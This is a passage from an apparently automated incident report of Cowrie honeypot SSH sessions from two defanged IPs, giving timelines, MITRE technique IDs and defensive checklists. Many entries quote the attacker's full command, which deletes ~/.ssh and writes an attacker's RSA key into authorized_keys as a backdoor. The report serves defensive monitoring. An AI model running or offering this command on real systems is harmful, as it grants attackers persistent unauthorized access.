| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:46:21` | `cowrie.session.connect` |
| `2026-04-11 14:46:21` | `cowrie.client.version` |
| `2026-04-11 14:46:21` | `cowrie.client.kex` |
| `2026-04-11 14:46:22` | `cowrie.login.success` |
| `2026-04-11 14:46:22` | `cowrie.session.params` |
| `2026-04-11 14:46:22` | `cowrie.command.input` |
| `2026-04-11 14:46:22` | `cowrie.command.failed` |
| `2026-04-11 14:46:23` | `cowrie.log.closed` |
| `2026-04-11 14:46:23` | `cowrie.session.params` |
| `2026-04-11 14:46:23` | `cowrie.command.input` |
| `2026-04-11 14:46:23` | `cowrie.session.file_download` |
| `2026-04-11 14:46:23` | `cowrie.log.closed` |
| `2026-04-11 14:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed2c28d431c

| Field | Detail |
|---|---|
| **Source IP** | `27.112.78[.]223` |
| **First Seen** | 2026-04-11 14:46 |
| **Last Seen** | 2026-04-11 14:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:46:24` | `cowrie.session.connect` |
| `2026-04-11 14:46:24` | `cowrie.client.version` |
| `2026-04-11 14:46:24` | `cowrie.client.kex` |
| `2026-04-11 14:46:25` | `cowrie.login.success` |
| `2026-04-11 14:46:25` | `cowrie.session.params` |
| `2026-04-11 14:46:25` | `cowrie.command.input` |
| `2026-04-11 14:46:25` | `cowrie.command.failed` |
| `2026-04-11 14:46:26` | `cowrie.log.closed` |
| `2026-04-11 14:46:26` | `cowrie.session.params` |
| `2026-04-11 14:46:26` | `cowrie.command.input` |
| `2026-04-11 14:46:26` | `cowrie.session.file_download` |
| `2026-04-11 14:46:26` | `cowrie.log.closed` |
| `2026-04-11 14:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.112.78[.]223` to AbuseIPDB if not already reported
- [ ] Block `27.112.78[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f20b9023d0c9

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:46 |
| **Last Seen** | 2026-04-11 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:46:25` | `cowrie.session.connect` |
| `2026-04-11 14:46:25` | `cowrie.client.version` |
| `2026-04-11 14:46:26` | `cowrie.client.kex` |
| `2026-04-11 14:46:26` | `cowrie.login.success` |
| `2026-04-11 14:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9812e58b814c

| Field | Detail |
|---|---|
| **Source IP** | `27.112.78[.]223` |
| **First Seen** | 2026-04-11 14:46 |
| **Last Seen** | 2026-04-11 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:46:32` | `cowrie.session.connect` |
| `2026-04-11 14:46:32` | `cowrie.client.version` |
| `2026-04-11 14:46:32` | `cowrie.client.kex` |
| `2026-04-11 14:46:33` | `cowrie.login.success` |
| `2026-04-11 14:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.112.78[.]223` to AbuseIPDB if not already reported
- [ ] Block `27.112.78[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551375b57337

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:52 |
| **Last Seen** | 2026-04-11 14:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:52:26` | `cowrie.session.connect` |
| `2026-04-11 14:52:26` | `cowrie.client.version` |
| `2026-04-11 14:52:26` | `cowrie.client.kex` |
| `2026-04-11 14:52:27` | `cowrie.login.success` |
| `2026-04-11 14:52:28` | `cowrie.session.params` |
| `2026-04-11 14:52:28` | `cowrie.command.input` |
| `2026-04-11 14:52:28` | `cowrie.command.failed` |
| `2026-04-11 14:52:28` | `cowrie.log.closed` |
| `2026-04-11 14:52:28` | `cowrie.session.params` |
| `2026-04-11 14:52:28` | `cowrie.command.input` |
| `2026-04-11 14:52:28` | `cowrie.session.file_download` |
| `2026-04-11 14:52:28` | `cowrie.log.closed` |
| `2026-04-11 14:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91e3a674ec9

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:52 |
| **Last Seen** | 2026-04-11 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:52:31` | `cowrie.session.connect` |
| `2026-04-11 14:52:31` | `cowrie.client.version` |
| `2026-04-11 14:52:31` | `cowrie.client.kex` |
| `2026-04-11 14:52:31` | `cowrie.login.success` |
| `2026-04-11 14:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6609b52c4eed

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:55 |
| **Last Seen** | 2026-04-11 14:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:55:32` | `cowrie.session.connect` |
| `2026-04-11 14:55:32` | `cowrie.client.version` |
| `2026-04-11 14:55:32` | `cowrie.client.kex` |
| `2026-04-11 14:55:33` | `cowrie.login.success` |
| `2026-04-11 14:55:33` | `cowrie.session.params` |
| `2026-04-11 14:55:33` | `cowrie.command.input` |
| `2026-04-11 14:55:33` | `cowrie.command.failed` |
| `2026-04-11 14:55:33` | `cowrie.log.closed` |
| `2026-04-11 14:55:34` | `cowrie.session.params` |
| `2026-04-11 14:55:34` | `cowrie.command.input` |
| `2026-04-11 14:55:34` | `cowrie.session.file_download` |
| `2026-04-11 14:55:34` | `cowrie.log.closed` |
| `2026-04-11 14:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57bd9d52840

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:55 |
| **Last Seen** | 2026-04-11 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:55:36` | `cowrie.session.connect` |
| `2026-04-11 14:55:36` | `cowrie.client.version` |
| `2026-04-11 14:55:36` | `cowrie.client.kex` |
| `2026-04-11 14:55:37` | `cowrie.login.success` |
| `2026-04-11 14:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea260a3ebf18

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:57 |
| **Last Seen** | 2026-04-11 14:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:57:00` | `cowrie.session.connect` |
| `2026-04-11 14:57:00` | `cowrie.client.version` |
| `2026-04-11 14:57:01` | `cowrie.client.kex` |
| `2026-04-11 14:57:01` | `cowrie.login.success` |
| `2026-04-11 14:57:02` | `cowrie.session.params` |
| `2026-04-11 14:57:02` | `cowrie.command.input` |
| `2026-04-11 14:57:02` | `cowrie.command.failed` |
| `2026-04-11 14:57:02` | `cowrie.log.closed` |
| `2026-04-11 14:57:02` | `cowrie.session.params` |
| `2026-04-11 14:57:02` | `cowrie.command.input` |
| `2026-04-11 14:57:02` | `cowrie.session.file_download` |
| `2026-04-11 14:57:02` | `cowrie.log.closed` |
| `2026-04-11 14:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29886c4c464f

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:57 |
| **Last Seen** | 2026-04-11 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:57:05` | `cowrie.session.connect` |
| `2026-04-11 14:57:05` | `cowrie.client.version` |
| `2026-04-11 14:57:05` | `cowrie.client.kex` |
| `2026-04-11 14:57:05` | `cowrie.login.success` |
| `2026-04-11 14:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84026db20628

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:58 |
| **Last Seen** | 2026-04-11 14:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:58:30` | `cowrie.session.connect` |
| `2026-04-11 14:58:30` | `cowrie.client.version` |
| `2026-04-11 14:58:30` | `cowrie.client.kex` |
| `2026-04-11 14:58:30` | `cowrie.login.success` |
| `2026-04-11 14:58:31` | `cowrie.session.params` |
| `2026-04-11 14:58:31` | `cowrie.command.input` |
| `2026-04-11 14:58:31` | `cowrie.command.failed` |
| `2026-04-11 14:58:31` | `cowrie.log.closed` |
| `2026-04-11 14:58:31` | `cowrie.session.params` |
| `2026-04-11 14:58:31` | `cowrie.command.input` |
| `2026-04-11 14:58:31` | `cowrie.session.file_download` |
| `2026-04-11 14:58:31` | `cowrie.log.closed` |
| `2026-04-11 14:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cbbe2b94e6f

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:58 |
| **Last Seen** | 2026-04-11 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:58:34` | `cowrie.session.connect` |
| `2026-04-11 14:58:34` | `cowrie.client.version` |
| `2026-04-11 14:58:34` | `cowrie.client.kex` |
| `2026-04-11 14:58:35` | `cowrie.login.success` |
| `2026-04-11 14:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c6390286215

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:59 |
| **Last Seen** | 2026-04-11 15:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:59:58` | `cowrie.session.connect` |
| `2026-04-11 14:59:58` | `cowrie.client.version` |
| `2026-04-11 14:59:59` | `cowrie.client.kex` |
| `2026-04-11 14:59:59` | `cowrie.login.success` |
| `2026-04-11 15:00:00` | `cowrie.session.params` |
| `2026-04-11 15:00:00` | `cowrie.command.input` |
| `2026-04-11 15:00:00` | `cowrie.command.failed` |
| `2026-04-11 15:00:00` | `cowrie.log.closed` |
| `2026-04-11 15:00:00` | `cowrie.session.params` |
| `2026-04-11 15:00:00` | `cowrie.command.input` |
| `2026-04-11 15:00:00` | `cowrie.session.file_download` |
| `2026-04-11 15:00:00` | `cowrie.log.closed` |
| `2026-04-11 15:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7d0209c597

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:00 |
| **Last Seen** | 2026-04-11 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:00:03` | `cowrie.session.connect` |
| `2026-04-11 15:00:03` | `cowrie.client.version` |
| `2026-04-11 15:00:03` | `cowrie.client.kex` |
| `2026-04-11 15:00:04` | `cowrie.login.success` |
| `2026-04-11 15:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9e8deb0a44

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:01 |
| **Last Seen** | 2026-04-11 15:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:01:31` | `cowrie.session.connect` |
| `2026-04-11 15:01:31` | `cowrie.client.version` |
| `2026-04-11 15:01:31` | `cowrie.client.kex` |
| `2026-04-11 15:01:32` | `cowrie.login.success` |
| `2026-04-11 15:01:32` | `cowrie.session.params` |
| `2026-04-11 15:01:32` | `cowrie.command.input` |
| `2026-04-11 15:01:32` | `cowrie.command.failed` |
| `2026-04-11 15:01:32` | `cowrie.log.closed` |
| `2026-04-11 15:01:32` | `cowrie.session.params` |
| `2026-04-11 15:01:32` | `cowrie.command.input` |
| `2026-04-11 15:01:33` | `cowrie.session.file_download` |
| `2026-04-11 15:01:33` | `cowrie.log.closed` |
| `2026-04-11 15:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb00209306f

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:01 |
| **Last Seen** | 2026-04-11 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:01:35` | `cowrie.session.connect` |
| `2026-04-11 15:01:35` | `cowrie.client.version` |
| `2026-04-11 15:01:35` | `cowrie.client.kex` |
| `2026-04-11 15:01:36` | `cowrie.login.success` |
| `2026-04-11 15:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6ca5ae2f4d

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:04 |
| **Last Seen** | 2026-04-11 15:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:04:31` | `cowrie.session.connect` |
| `2026-04-11 15:04:31` | `cowrie.client.version` |
| `2026-04-11 15:04:31` | `cowrie.client.kex` |
| `2026-04-11 15:04:31` | `cowrie.login.success` |
| `2026-04-11 15:04:32` | `cowrie.session.params` |
| `2026-04-11 15:04:32` | `cowrie.command.input` |
